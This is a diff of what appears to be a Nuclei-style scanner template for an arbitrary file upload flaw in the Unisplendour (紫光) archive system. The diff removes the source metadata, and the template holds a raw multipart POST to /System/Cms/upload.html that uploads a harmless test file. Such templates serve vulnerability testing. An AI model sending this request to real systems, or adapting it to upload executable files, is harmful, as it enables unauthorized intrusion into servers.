@@ -3,12 +3,8 @@ info:
   name: 紫光档案系统任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ob6gp9vsvp7gtw64'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ob6gp9vsvp7gtw64
-    fofa: 暂无
 http:
 - raw:
   - 'POST /System/Cms/upload.html?token= HTTP/1.1
@@ -32,14 +28,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3enKbCUwg60aGZcr
 
 
-
-
     ------WebKitFormBoundary3enKbCUwg60aGZcr
 
 
     Content-Disposition: form-data; name="userID"
-
-
 
 
     admin
@@ -51,8 +43,6 @@ http:
     Content-Disposition: form-data; name="fondsid"
 
 
-
-
     1
 
 
@@ -60,8 +50,6 @@ http:
 
 
     Content-Disposition: form-data; name="comid"
-
-
 
 
     1
@@ -73,8 +61,6 @@ http:
     Content-Disposition: form-data; name="token"
 
 
-
-
     1
 
 
@@ -82,8 +68,6 @@ http:
 
 
     Content-Disposition: form-data; name="files[]"; filename="test.txt"
-
-
 
 
     file-upload-test
